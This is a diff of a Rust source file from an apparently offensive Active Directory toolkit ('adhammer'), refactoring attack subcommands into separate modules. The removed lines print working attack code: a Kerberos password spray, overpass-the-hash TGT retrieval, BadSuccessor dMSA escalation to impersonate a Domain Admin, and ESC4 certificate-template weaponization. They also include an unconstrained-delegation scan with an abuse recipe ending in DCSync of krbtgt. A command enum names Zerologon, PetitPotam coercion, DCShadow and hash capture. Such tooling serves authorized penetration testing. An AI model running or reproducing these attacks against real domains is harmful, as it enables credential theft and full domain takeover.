@@ -283,7 +283,7 @@ enum AttackCmd {
     /// Kerberos AS-REP roast + Kerberoast (RC4/AES hashcat output).
     Roast(ScanArgs),
     /// Kerberos password spray / user enumeration.
-    Spray(SprayArgs),
+    Spray(attacks::spray::SprayArgs),
     /// LDAP abuse: add-spn / add-member / set-password / write-rbcd.
     Abuse(AbuseArgs),
     /// Coerce the DC to authenticate to a listener (PetitPotam / MS-EFSR).
@@ -296,7 +296,7 @@ enum AttackCmd {
     /// account with protocol transition (impersonate any user to the allowed service).
     Constrained(RbcdArgs),
     /// Ask-TGT: get a TGT with a password and write a reusable ccache (Kerberos `-k` workflows).
-    Asktgt(AsktgtArgs),
+    Asktgt(attacks::asktgt::AsktgtArgs),
     /// DCSync: replicate a target's secrets via DRSUAPI over a sealed RPC channel.
     Dcsync(DcsyncArgs),
     /// Capture NetNTLMv2 from coerced/poisoned victims (SMB listener → hashcat -m 5600).
@@ -343,9 +343,9 @@ enum AttackCmd {
     /// Find `TRUSTED_FOR_DELEGATION` hosts (non-DC) — unconstrained-delegation abuse targets.
     Unconstrained(ScanArgs),
     /// BadSuccessor (Server 2025 dMSA) — create a delegated MSA that succeeds a chosen victim.
-    Badsuccessor(BadsuccessorArgs),
+    Badsuccessor(attacks::badsuccessor::BadsuccessorArgs),
     /// ESC4 — write a certificate template's attributes to make it ESC1-vulnerable.
-    Esc4(Esc4Args),
+    Esc4(attacks::esc4::Esc4Args),
     /// Shadow Credentials — thin alias over `attack abuse --action add-keycred` / `pkinit`.
     Shadowcred(ShadowcredArgs),
     /// DCShadow — default: enumerate DCSync-capable principals. `--prep <name>` registers a rogue
@@ -793,69 +793,11 @@ struct DcsyncArgs {
     limit: Option<usize>,
 }
 
-#[derive(Parser)]
-struct AsktgtArgs {
-    /// Username (sAMAccountName)
-    #[arg(long)]
-    user: String,
-    /// Kerberos realm, e.g. CORP.LOCAL
-    #[arg(long)]
-    realm: String,
-    /// KDC `host[:port]`
-    #[arg(long)]
-    kdc: String,
-    /// Password auth (AES256). Mutually exclusive with --nt-hash.
-    #[arg(long)]
-    password: Option<String>,
-    /// NT hash (32 hex) → overpass-the-hash via RC4-HMAC (legacy / RC4-enabled DCs).
-    #[arg(long)]
-    nt_hash: Option<String>,
-    /// Output ccache path (defaults to `<user>.ccache`)
-    #[arg(long)]
-    out: Option<String>,
-}
+// AsktgtArgs moved to `attacks::asktgt` in arch-0.
 
-#[derive(Parser)]
-struct BadsuccessorArgs {
-    /// LDAP URL (LDAPS strongly preferred — the dMSA link is a privileged write)
-    #[arg(long)]
-    url: String,
-    #[arg(long)]
-    user: String,
-    #[arg(long)]
-    password: String,
-    #[arg(long)]
-    insecure: bool,
-    /// OU/container the attacker can create objects in (e.g. `OU=Servers,DC=corp,DC=local`).
-    /// Defaults to `CN=Managed Service Accounts` under the domain root.
-    #[arg(long)]
-    container: Option<String>,
-    /// Name to give the new dMSA (a `$`-suffixed sAMAccountName is appended).
-    #[arg(long)]
-    dmsa_name: String,
-    /// sAMAccountName of the account to succeed (typically a Domain Admin).
-    #[arg(long)]
-    target: String,
-}
+// BadsuccessorArgs moved to `attacks::badsuccessor` in arch-0.
 
-#[derive(Parser)]
-struct Esc4Args {
-    #[arg(long)]
-    url: String,
-    #[arg(long)]
-    user: String,
-    #[arg(long)]
-    password: String,
-    #[arg(long)]
-    insecure: bool,
-    /// cn of the certificate template to weaponize (e.g. `User` or a custom one).
-    #[arg(long)]
-    template: String,
-    /// Optional principal (sAMAccountName / SID) to grant Enroll on the template.
-    /// Omit to leave the DACL untouched and only flip the flags.
-    #[arg(long)]
-    enrollee: Option<String>,
-}
+// Esc4Args moved to `attacks::esc4` in arch-0.
 
 #[derive(Parser)]
 struct ShadowcredArgs {
@@ -1000,21 +942,7 @@ struct AbuseArgs {
     host: Option<String>,
 }
 
-#[derive(Parser)]
-struct SprayArgs {
-    /// KDC `host[:port]`
-    #[arg(long)]
-    kdc: String,
-    /// Kerberos realm, e.g. CORP.LOCAL
-    #[arg(long)]
-    realm: String,
-    /// Users: comma-separated list, or @file with one per line
-    #[arg(long)]
-    users: String,
-    /// Single password to spray across all users
-    #[arg(long)]
-    password: String,
-}
+// SprayArgs moved to `attacks::spray` in arch-0.
 
 #[derive(Parser)]
 struct LsaArgs {
@@ -1213,13 +1141,13 @@ async fn dispatch(cmd: Command) -> Result<()> {
         Command::Enum(EnumCmd::Wkssvc(a)) => wkssvc_enum(a).await,
         Command::Enum(EnumCmd::Hku(a)) => hku_enum(a).await,
         Command::Attack(AttackCmd::Roast(a)) => roast(a).await,
-        Command::Attack(AttackCmd::Spray(a)) => spray(a).await,
+        Command::Attack(AttackCmd::Spray(a)) => attacks::spray::spray(a).await,
         Command::Attack(AttackCmd::Abuse(a)) => abuse(a).await,
         Command::Attack(AttackCmd::Coerce(a)) => coerce(a).await,
         Command::Attack(AttackCmd::Zerologon(a)) => attacks::zerologon::zerologon(a).await,
         Command::Attack(AttackCmd::Rbcd(a)) => rbcd(a).await,
         Command::Attack(AttackCmd::Constrained(a)) => rbcd(a).await,
-        Command::Attack(AttackCmd::Asktgt(a)) => asktgt(a).await,
+        Command::Attack(AttackCmd::Asktgt(a)) => attacks::asktgt::asktgt(a).await,
         Command::Attack(AttackCmd::Dcsync(a)) => dcsync(a).await,
         Command::Attack(AttackCmd::Capture(a)) => smb2_client::server::capture(&a.listen)
             .await
@@ -1247,9 +1175,9 @@ async fn dispatch(cmd: Command) -> Result<()> {
             }
             pth(a).await
         }
-        Command::Attack(AttackCmd::Unconstrained(a)) => unconstrained(a).await,
-        Command::Attack(AttackCmd::Badsuccessor(a)) => badsuccessor(a).await,
-        Command::Attack(AttackCmd::Esc4(a)) => esc4(a).await,
+        Command::Attack(AttackCmd::Unconstrained(a)) => attacks::unconstrained::unconstrained(a).await,
+        Command::Attack(AttackCmd::Badsuccessor(a)) => attacks::badsuccessor::badsuccessor(a).await,
+        Command::Attack(AttackCmd::Esc4(a)) => attacks::esc4::esc4(a).await,
         Command::Attack(AttackCmd::Shadowcred(a)) => shadowcred(a).await,
         Command::Attack(AttackCmd::Dcshadow(a)) => dcshadow(a).await,
         Command::Check(CheckCmd::Adcs(a)) => check_adcs(a).await,
@@ -1293,28 +1221,7 @@ async fn rbcd(a: RbcdArgs) -> Result<()> {
     Ok(())
 }
 
-/// Ask-TGT: obtain a TGT with a password and write a reusable MIT ccache.
-async fn asktgt(a: AsktgtArgs) -> Result<()> {
-    let ccache = match (&a.nt_hash, &a.password) {
-        (Some(h), None) => {
-            let nt = parse_nt_hash(h)?;
-            println!("[*] overpass-the-hash (RC4-HMAC) for {}", a.user);
-            adhammer_kerberos::overpass_the_hash(&a.user, &a.realm, &a.kdc, &nt).await?
-        }
-        (None, Some(pw)) => adhammer_kerberos::asktgt(&a.user, &a.realm, &a.kdc, pw).await?,
-        _ => anyhow::bail!("provide exactly one of --password or --nt-hash"),
-    };
-    let out = a.out.unwrap_or_else(|| format!("{}.ccache", a.user));
-    std::fs::write(&out, &ccache)?;
-    println!(
-        "[+] TGT obtained for {} → {out} ({} bytes)",
-        a.user,
-        ccache.len()
-    );
-    println!("    export KRB5CCNAME={out}  (use with Kerberos-aware tooling)");
-    Ok(())
-}
-
+// fn asktgt moved to `attacks::asktgt` in arch-0.
 /// DCSync: bind DRSUAPI over a sign+sealed channel, then replicate a target's secrets.
 async fn dcsync(mut a: DcsyncArgs) -> Result<()> {
     a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
@@ -2934,82 +2841,7 @@ async fn abuse(mut a: AbuseArgs) -> Result<()> {
     Ok(())
 }
 
-/// Kerberos password spray: one password across a user list, classified by KDC response.
-async fn spray(a: SprayArgs) -> Result<()> {
-    use adhammer_kerberos::{check_credential, CredResult};
-
-    let users: Vec<String> = if let Some(path) = a.users.strip_prefix('@') {
-        std::fs::read_to_string(path)
-            .with_context(|| format!("read users list {path}"))?
-            .lines()
-            .map(|l| l.trim().to_string())
-            .filter(|l| !l.is_empty())
-            .collect()
-    } else if std::path::Path::new(&a.users).is_file() {
-        // Path passed without `@` prefix — a common gotcha. Treat as a file with a hint.
-        eprintln!(
-            "[!] `--users {}` looks like a file path — use `--users @{}` to read it as a list. Treating the arg as one user name.",
-            a.users, a.users
-        );
-        vec![a.users.clone()]
-    } else {
-        a.users
-            .split(',')
-            .map(|u| u.trim().to_string())
-            .filter(|u| !u.is_empty())
-            .collect()
-    };
-
-    if users.is_empty() {
-        anyhow::bail!("no users to spray (empty --users)");
-    }
-    eprintln!(
-        "[*] spraying {} user(s) against {} @ {} …",
-        users.len(),
-        a.realm,
-        a.kdc
-    );
-    let (mut valid, mut asrep, mut disabled, mut other) = (0u32, 0u32, 0u32, 0u32);
-    for u in &users {
-        match check_credential(u, &a.password, &a.realm, &a.kdc).await {
-            Ok(CredResult::Valid) => {
-                valid += 1;
-                println!("[+] VALID           {u}:{}", a.password);
-            }
-            Ok(CredResult::ValidButExpired) => {
-                valid += 1;
-                println!("[+] VALID (expired) {u}:{}", a.password);
-            }
-            Ok(CredResult::Disabled) => {
-                disabled += 1;
-                println!("[-] disabled/locked {u}");
-            }
-            Ok(CredResult::NoPreAuth) => {
-                asrep += 1;
-                println!("[*] AS-REP roastable {u} (no pre-auth)");
-            }
-            Ok(CredResult::Invalid) | Ok(CredResult::NoSuchUser) => {} // quiet — the norm
-            Ok(CredResult::Other(c)) => {
-                other += 1;
-                eprintln!("    {u}: KDC error {c}");
-            }
-            Err(e) => {
-                other += 1;
-                eprintln!("    {u}: {e}");
-            }
-        }
-    }
-    eprintln!(
-        "[*] spray done: {}/{} valid, {} AS-REP roastable, {} disabled, {} other error(s)",
-        valid,
-        users.len(),
-        asrep,
-        disabled,
-        other
-    );
-    Ok(())
-}
-
+// fn spray moved to `attacks::spray` in arch-0.
 /// LSAT name→SID over \lsarpc (SMB2 → NTLM → DCE/RPC → LsarOpenPolicy2 → LsarLookupNames).
 async fn lsa(a: LsaArgs) -> Result<()> {
     use dcerpc::lsat::LsatClient;
@@ -4864,148 +4696,8 @@ async fn scan(a: ScanArgs) -> Result<()> {
     Ok(())
 }
 
-/// `attack badsuccessor` — Akamai/Yuval Gordon 2025 dMSA escalation. Any principal that can
-/// create a child object in *any* container can create a delegated MSA whose
-/// `msDS-ManagedAccountPrecededByLink` points at a Domain Admin, and set
-/// `msDS-DelegatedMSAState=2` (Migrated). The Server 2025 KDC then issues TGTs to the dMSA
-/// carrying the *victim's* PAC — full impersonation, no ACE on the victim, no password reset.
-///
-/// LIVE VALIDATION OWED: the attack landed on Server 2025 GA; behaviour on later Cumulative
-/// Updates may change. Run against the 2025 DC on your matrix and confirm the dMSA is
-/// accepted (LDAP add succeeds) and issues a working TGT.
-async fn badsuccessor(a: BadsuccessorArgs) -> Result<()> {
-    use adhammer_collector::{Collector, LdapConfig};
-    let cfg = LdapConfig {
-        url: a.url.clone(),
-        bind_dn: a.user.clone(),
-        password: a.password.clone(),
-        base_dn: None,
-        insecure: a.insecure,
-        gssapi: false,
-    };
-    let mut c = Collector::connect(&cfg).await?;
-    let victim_dn = c.resolve_dn(&a.target).await?;
-    let base = c.base_dn().to_string();
-    let container = a
-        .container
-        .clone()
-        .unwrap_or_else(|| format!("CN=Managed Service Accounts,{base}"));
-
-    let name = a.dmsa_name.trim_end_matches('$');
-    let sam = format!("{name}$");
-    let dn = format!("CN={name},{container}");
-    // Derive DNS domain from base DN: "DC=testlab,DC=local" -> "testlab.local".
-    let dns_domain: String = base
-        .split(',')
-        .filter_map(|p| {
-            p.trim()
-                .strip_prefix("DC=")
-                .or_else(|| p.trim().strip_prefix("dc="))
-        })
-        .collect::<Vec<_>>()
-        .join(".");
-    let dns_host = format!("{name}.{dns_domain}");
-
-    // dMSA is a subclass of msDS-GroupManagedServiceAccount (structural, inherits from computer).
-    // Adding `computer`/`user`/`person` explicitly conflicts with the schema on Server 2025 —
-    // let the structural chain resolve them.
-    let attrs: Vec<(&str, Vec<Vec<u8>>)> = vec![
-        (
-            "objectClass",
-            vec![
-                b"top".to_vec(),
-                b"msDS-DelegatedManagedServiceAccount".to_vec(),
-            ],
-        ),
-        ("sAMAccountName", vec![sam.as_bytes().to_vec()]),
-        ("dNSHostName", vec![dns_host.as_bytes().to_vec()]),
-        // UAC = WORKSTATION_TRUST_ACCOUNT (0x1000).
-        ("userAccountControl", vec![b"4096".to_vec()]),
-        // AES256 | AES128 | RC4 = 28 (minimum modern default).
-        ("msDS-SupportedEncryptionTypes", vec![b"28".to_vec()]),
-        // Required by gMSA schema — 30 days is the default rotation.
-        ("msDS-ManagedPasswordInterval", vec![b"30".to_vec()]),
-        // 2 = kMSA_MIGRATED — the "successor" state the KDC recognises.
-        ("msDS-DelegatedMSAState", vec![b"2".to_vec()]),
-        // The victim link — the KDC issues the dMSA a TGT with THIS account's PAC.
-        (
-            "msDS-ManagedAccountPrecededByLink",
-            vec![victim_dn.as_bytes().to_vec()],
-        ),
-    ];
-    c.add_object(&dn, attrs).await?;
-    println!("[+] created dMSA {dn}");
-    println!(
-        "    → succeeds {} (PAC of the victim is issued to {sam})",
-        a.target
-    );
-    println!(
-        "    Next: request a TGT as {sam} and use it as if it were {}",
-        a.target
-    );
-    Ok(())
-}
-
-/// `attack esc4` — weaponize a certificate template we can write. Flip the two flags that make
-/// a template ESC1-vulnerable: `msPKI-Certificate-Name-Flag |= ENROLLEE_SUPPLIES_SUBJECT`, and
-/// `msPKI-Enrollment-Flag &= ~PEND_ALL_REQUESTS`. Optionally grant `--enrollee` an Enroll ACE.
-/// After this runs, `attack esc1 --template <name> --alt-name Administrator` finishes the chain.
-async fn esc4(a: Esc4Args) -> Result<()> {
-    use adhammer_collector::{Collector, LdapConfig};
-    const CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT: i64 = 0x0000_0001;
-    const CT_FLAG_PEND_ALL_REQUESTS: i64 = 0x0000_0002;
-
-    let cfg = LdapConfig {
-        url: a.url.clone(),
-        bind_dn: a.user.clone(),
-        password: a.password.clone(),
-        base_dn: None,
-        insecure: a.insecure,
-        gssapi: false,
-    };
-    let mut c = Collector::connect(&cfg).await?;
-    let base = c.base_dn().to_string();
-    let template_dn = format!(
-        "CN={},CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{base}",
-        a.template
-    );
-
-    // Read current flags, flip, write back. Replace-modify is safe because the values are
-    // scalar u32-in-string form.
-    let (name_flag, enroll_flag) = c.read_template_flags(&template_dn).await?;
-    let new_name = name_flag | CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT;
-    let new_enroll = enroll_flag & !CT_FLAG_PEND_ALL_REQUESTS;
-    c.write_binary(
-        &template_dn,
-        "msPKI-Certificate-Name-Flag",
-        new_name.to_string().into_bytes(),
-    )
-    .await?;
-    c.write_binary(
-        &template_dn,
-        "msPKI-Enrollment-Flag",
-        new_enroll.to_string().into_bytes(),
-    )
-    .await?;
-    println!(
-        "[+] {template_dn}: msPKI-Certificate-Name-Flag {name_flag}→{new_name} (SUPPLIES_SUBJECT), \
-         msPKI-Enrollment-Flag {enroll_flag}→{new_enroll} (cleared PEND_ALL_REQUESTS)"
-    );
-
-    if let Some(enrollee) = &a.enrollee {
-        eprintln!(
-            "[!] --enrollee {enrollee}: Enroll-ACE write on template DACL not implemented \
-                   yet — flags alone often suffice if the template is already broadly enrollable. \
-                   Set the ACE manually or via `attack abuse` if needed."
-        );
-    }
-    println!(
-        "    → attack esc1 --template {} --alt-name Administrator",
-        a.template
-    );
-    Ok(())
-}
-
+// fn badsuccessor moved to `attacks::badsuccessor` in arch-0.
+// fn esc4 moved to `attacks::esc4` in arch-0.
 /// `attack shadowcred` — thin, top-level command for Shadow Credentials. Under the hood this
 /// is `attack abuse --action add-keycred` (and, with `--pkinit`, `--action pkinit`).
 async fn shadowcred(a: ShadowcredArgs) -> Result<()> {
@@ -5361,77 +5053,7 @@ async fn icpr_esc1(a: IcprEsc1Args) -> Result<()> {
     Ok(())
 }
 
-/// `attack unconstrained` — locate hosts running with `TRUSTED_FOR_DELEGATION` (UAC bit 0x80000)
-/// and print the abuse recipe for each. A domain controller carrying the bit is expected
-/// (that's what makes it a DC); a *non-DC* with the bit is the abuse target — every user's TGT
-/// that authenticates there is cached, and the DC can be coerced to be one of those users.
-///
-/// LDAP-only recon; no host is contacted. The exploit chain itself runs in later commands
-/// (`attack coerce` for the trigger, capture/extraction to walk off with the TGT).
-async fn unconstrained(a: ScanArgs) -> Result<()> {
-    use adhammer_core::object::uac;
-    /// SERVER_TRUST_ACCOUNT — the UAC bit that marks a computer as a domain controller.
-    /// A DC's own delegation bit is not the abuse: it's inherent to being a DC.
-    const SERVER_TRUST_ACCOUNT: u32 = 0x0000_2000;
-
-    let snap = Collector::connect(&config(&a)).await?.collect().await?;
-    let mut risky: Vec<(&str, &str)> = Vec::new(); // (sAM, DN) of non-DC hosts w/ the bit
-    let mut dc_baseline = 0usize;
-    let mut proto_transition: Vec<(&str, &str)> = Vec::new(); // constrained w/ protocol transition
-
-    for o in &snap.objects {
-        let u = o.uac();
-        if u == 0 {
-            continue;
-        }
-        let sam = o.one("sAMAccountName").unwrap_or("");
-        let is_dc = u & SERVER_TRUST_ACCOUNT != 0;
-        if u & uac::TRUSTED_FOR_DELEGATION != 0 {
-            if is_dc {
-                dc_baseline += 1;
-            } else {
-                risky.push((sam, &o.dn));
-            }
-        }
-        if u & uac::TRUSTED_TO_AUTH_FOR_DELEGATION != 0 {
-            proto_transition.push((sam, &o.dn));
-        }
-    }
-
-    println!(
-        "== Unconstrained delegation ({} DC baseline, {} risky non-DC host(s)) ==",
-        dc_baseline,
-        risky.len()
-    );
-    if risky.is_empty() {
-        println!("  (none — only DCs carry TRUSTED_FOR_DELEGATION, which is expected)");
-    } else {
-        for (sam, dn) in &risky {
-            println!("  [!] {sam:<28}  {dn}");
-        }
-        println!();
-        println!("Abuse recipe (once you control one of these hosts):");
-        println!("  1. attack coerce --host <DC> --pipe efsrpc  --listener <this-host>");
-        println!("     (or --pipe spoolss|netdfs|fssagentrpc)");
-        println!("  2. Capture the incoming Kerberos AP-REQ on this host.");
-        println!("  3. Extract the forwarded TGT from the Authenticator (GSS-KRB5 Deleg flag).");
-        println!("  4. attack dcsync --user krbtgt   (or golden-ticket forge)");
-    }
-
-    if !proto_transition.is_empty() {
-        println!();
-        println!(
-            "== Constrained delegation w/ protocol transition ({}) — S4U2Self abuse ==",
-            proto_transition.len()
-        );
-        for (sam, dn) in &proto_transition {
-            println!("  {sam:<28}  {dn}");
-        }
-        println!("  → attack constrained --host <this-host> --target <spn>");
-    }
-    Ok(())
-}
-
+// fn unconstrained moved to `attacks::unconstrained` in arch-0.
 async fn roast(a: ScanArgs) -> Result<()> {
     let snap = Collector::connect(&config(&a)).await?.collect().await?;
     let realm = snap
